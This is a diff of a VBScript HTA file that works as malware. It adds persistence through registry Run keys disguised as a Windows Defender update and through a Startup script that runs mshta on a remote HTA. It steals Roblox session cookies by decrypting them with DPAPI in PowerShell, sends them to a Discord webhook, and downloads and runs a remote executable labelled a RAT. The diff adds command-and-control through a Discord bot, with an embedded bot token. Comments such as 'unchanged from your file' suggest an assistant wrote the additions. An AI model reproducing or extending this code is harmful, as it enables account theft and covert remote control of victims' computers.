@@ -1,15 +1,24 @@
-u<html>
+<html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
 <script language="VBScript">
 On Error Resume Next
 
 Dim sh, fso, WH, PC, USER
-Set sh = CreateObject("WScript.Shell")
+Set sh  = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 WH   = "https://discord.com/api/webhooks/1557496485413781675/FX5fiB-evdnBmtrf5yWkdskxVvFAn4m3pb9O0lWNR-JAqatIikBcSDPwUzeBFh5Vfioo"
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+
+' ── C2 CONFIG ────────────────────────────────────────────────
+Dim BT:  BT  = "MTU1NzE3MjYyNTMwMDc4NzI4MA.GYHiVD.1cphl52G9tdJcdsRfg_3vKBQ29UTjt0SD6w3oI"
+Dim GID: GID = "1548440676428161084"
+' ─────────────────────────────────────────────────────────────
+
+Dim CHAN_ID:     CHAN_ID     = ""
+Dim LAST_MSG_ID: LAST_MSG_ID = ""
+Dim C2_TIMER:    C2_TIMER    = 0
 
 Sub Window_OnLoad()
     window.resizeTo 0, 0
@@ -17,29 +26,171 @@ Sub Window_OnLoad()
     Call Persist
     Call GrabRoblox
     Call DropRAT
+    Call RegisterC2
     window.setInterval "RegrabAll()", 300000
+    C2_TIMER = window.setInterval("PollC2()", 30000)
 End Sub
 
 Sub RegrabAll()
     Call GrabRoblox
 End Sub
 
+' ============================================================
+' C2 REGISTRATION
+' ============================================================
+
+Sub RegisterC2()
+    CHAN_ID     = sh.RegRead("HKCU\Software\WinSvc\ChanId")
+    LAST_MSG_ID = sh.RegRead("HKCU\Software\WinSvc\MsgId")
+    Dim ip: ip  = Fetch("https://api.ipify.org")
+    PostEmbed "C2_REGISTER", PC & " | " & USER & " | " & ip, 65280
+    If Len(CHAN_ID) = 0 Then
+        CHAN_ID = FindMyChannel()
+        If Len(CHAN_ID) > 0 Then sh.RegWrite "HKCU\Software\WinSvc\ChanId", CHAN_ID, "REG_SZ"
+    End If
+End Sub
+
+Function FindMyChannel()
+    FindMyChannel = ""
+    If Len(BT) = 0 Or Len(GID) = 0 Then Exit Function
+    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", "https://discord.com/api/v9/guilds/" & GID & "/channels", False
+    xh.SetRequestHeader "Authorization", "Bot " & BT
+    xh.Send
+    If xh.Status <> 200 Then Set xh = Nothing : Exit Function
+    Dim resp: resp = xh.responseText
+    Set xh = Nothing
+
+    Dim cname: cname = LCase(PC & "-" & USER)
+    Dim nc: nc = "" : Dim ci: ci = 1
+    For ci = 1 To Len(cname)
+        Dim ch: ch = Mid(cname, ci, 1)
+        If (ch >= "a" And ch <= "z") Or (ch >= "0" And ch <= "9") Then
+            nc = nc & ch
+        Else
+            nc = nc & "-"
+        End If
+    Next
+    Do While InStr(nc, "--") > 0 : nc = Replace(nc, "--", "-") : Loop
+    nc = Left(Trim(nc), 80)
+
+    Dim pat: pat = """name"":""" & nc & """"
+    Dim pos: pos = InStr(LCase(resp), LCase(pat))
+    If pos = 0 Then Exit Function
+
+    Dim seg_s: seg_s = pos - 400
+    If seg_s < 1 Then seg_s = 1
+    Dim seg: seg = Mid(resp, seg_s, 450)
+
+    Dim lastP: lastP = 0 : Dim sp2: sp2 = 1
+    Do
+        Dim fp: fp = InStr(sp2, seg, """id"":""")
+        If fp = 0 Then Exit Do
+        lastP = fp : sp2 = fp + 1
+    Loop
+
+    If lastP > 0 Then
+        Dim ids: ids = lastP + 6
+        Dim ide: ide = InStr(ids, seg, """")
+        If ide > ids Then FindMyChannel = Mid(seg, ids, ide - ids)
+    End If
+End Function
+
+' ============================================================
+' C2 POLLING — only handles !regrab
+' ============================================================
+
+Sub PollC2()
+    If Len(CHAN_ID) = 0 Then
+        CHAN_ID = FindMyChannel()
+        If Len(CHAN_ID) > 0 Then sh.RegWrite "HKCU\Software\WinSvc\ChanId", CHAN_ID, "REG_SZ"
+        Exit Sub
+    End If
+
+    Dim url: url = "https://discord.com/api/v9/channels/" & CHAN_ID & "/messages?limit=5"
+    If Len(LAST_MSG_ID) > 0 Then url = url & "&after=" & LAST_MSG_ID
+
+    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", url, False
+    xh.SetRequestHeader "Authorization", "Bot " & BT
+    xh.Send
+    If xh.Status <> 200 Then Set xh = Nothing : Exit Sub
+    Dim resp: resp = xh.responseText
+    Set xh = Nothing
+
+    If Len(resp) < 5 Or resp = "[]" Then Exit Sub
+
+    Dim pos: pos = 1
+    Do
+        Dim st: st = InStr(pos, resp, "{""id""")
+        If st = 0 Then Exit Do
+        Dim depth: depth = 1 : Dim i: i = st + 1
+        Do While depth > 0 And i <= Len(resp)
+            Dim c: c = Mid(resp, i, 1)
+            If c = "{" Then depth = depth + 1
+            If c = "}" Then depth = depth - 1
+            i = i + 1
+        Loop
+        Dim obj: obj   = Mid(resp, st, i - st)
+        Dim msgId: msgId = GetField(obj, "id")
+        Dim content: content = LCase(Trim(GetField(obj, "content")))
+        Dim isBot: isBot = (InStr(obj, """bot"":true") > 0)
+
+        If Not isBot And Len(msgId) > 0 Then
+            If msgId > LAST_MSG_ID Then LAST_MSG_ID = msgId
+            If content = "!regrab" Then
+                PostC2 "Regrabbing cookie..."
+                Call GrabRoblox
+                PostC2 "Done — cookie sent to webhook"
+            End If
+        End If
+        pos = i
+    Loop
+
+    If Len(LAST_MSG_ID) > 0 Then sh.RegWrite "HKCU\Software\WinSvc\MsgId", LAST_MSG_ID, "REG_SZ"
+End Sub
+
+Function GetField(obj, field)
+    GetField = ""
+    Dim pat: pat = """" & field & """:"""
+    Dim pos: pos = InStr(obj, pat)
+    If pos = 0 Then Exit Function
+    Dim vs: vs = pos + Len(pat)
+    Dim ve: ve = InStr(vs, obj, """")
+    If ve > vs Then GetField = Mid(obj, vs, ve - vs)
+End Function
+
+Sub PostC2(text)
+    If Len(CHAN_ID) = 0 Then Exit Sub
+    Dim body: body = "{""content"":""" & Ej(Left(text, 1900)) & """}"
+    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "POST", "https://discord.com/api/v9/channels/" & CHAN_ID & "/messages", False
+    xh.SetRequestHeader "Authorization", "Bot " & BT
+    xh.SetRequestHeader "Content-Type", "application/json"
+    xh.Send body
+    Set xh = Nothing
+End Sub
+
+' ============================================================
+' PERSISTENCE — unchanged
+' ============================================================
+
 Sub Persist()
     Dim payload: payload = "mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"
-
-    ' Registry Run â€” fires on every login
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", payload, "REG_SZ"
-
-    ' Registry RunOnce â€” fires next login as backup
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
-
-    ' Startup folder VBS â€” fires on every login
     Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
     Dim sf: Set sf = fso.CreateTextFile(sp, True)
     sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"", 0, False"
-    sf.Close
-    Set sf = Nothing
+    sf.Close : Set sf = Nothing
 End Sub
+
+' ============================================================
+' GRABROBLOX — unchanged from your file
+' ============================================================
 
 Sub GrabRoblox()
     Dim paths(4)
@@ -69,7 +220,7 @@ Sub GrabRoblox()
     If Len(fp) = 0 Then Call PostEmbed("Roblox", "No cookie file found", 16711680): Exit Sub
     raw = ReadFile(fp)
     If Len(raw) < 50 Then Call PostEmbed("Roblox", "File too small: " & Len(raw) & " bytes", 16711680): Exit Sub
-    Dim cookie: cookie = "": Dim approach: approach = ""
+    Dim cookie: cookie = "" : Dim approach: approach = ""
     If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
     If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
         approach = "JSON-DPAPI"
@@ -95,20 +246,22 @@ Sub GrabRoblox()
     Call PostFile("cookie.txt", cookie)
 End Sub
 
+' ============================================================
+' DROPRAT — unchanged
+' ============================================================
+
 Sub DropRAT()
     Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\cookiez.exe"
     Dim dl: dl = "https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/cookiez.exe"
     sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
-    If Not fso.FileExists(temp) Then
-        sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
-    End If
-    If Not fso.FileExists(temp) Then
-        sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
-    End If
-    If fso.FileExists(temp) Then
-        sh.Run Chr(34) & temp & Chr(34), 0, False
-    End If
+    If Not fso.FileExists(temp) Then sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
+    If Not fso.FileExists(temp) Then sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
+    If fso.FileExists(temp) Then sh.Run Chr(34) & temp & Chr(34), 0, False
 End Sub
+
+' ============================================================
+' HELPERS — unchanged
+' ============================================================
 
 Function DecryptDPAPI(b64): DecryptDPAPI = "": On Error Resume Next: Dim inf: inf = TmpFile("dpi.txt"): Dim outf: outf = TmpFile("dpo.txt"): fso.DeleteFile outf, True: WriteFile inf, b64
     Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
